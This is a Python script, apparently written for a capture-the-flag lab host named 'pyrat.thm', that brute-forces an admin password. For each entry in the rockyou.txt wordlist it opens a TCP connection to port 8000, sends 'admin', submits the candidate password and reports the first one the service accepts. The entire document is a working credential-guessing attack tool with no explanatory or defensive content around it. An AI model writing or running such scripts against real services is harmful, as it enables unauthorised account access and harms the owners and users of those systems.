import socket 
import sys

# Setting up the host
host = 'pyrat.thm'
port = 8000

# Setting up the wordlist
wordlist = "/home/kali/Documents/rockyou.txt"


def fuzz_password(password_wordlist):
    try:
        with open(password_wordlist, 'r') as file:
            for password in file:
                password = password.strip()


                #establis connection to the target host
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))

                    #send the 'admin command first
                    s.sendall(b'admin\n')

                    #recieve the response 
                    response = s.recv(1024).decode().strip()

                    if 'password' in response.lower():
                        s.sendall((password + '\n').encode())

                        # receive the respnse afthe entering the password
                        response = s.recv(1024).decode().strip()

                        #check if the password is correct
                        if 'password' in response.lower():
                            continue
                        else:
                            print(f"the password is {password}")
                            break
                    else:
                        print(f'no password found')
                        break

    except FileNotFoundError:
        print(f"file not found")

    except Exception as e:
        print(f"exceptiomn occured {e}")

#running the function
fuzz_password(wordlist)
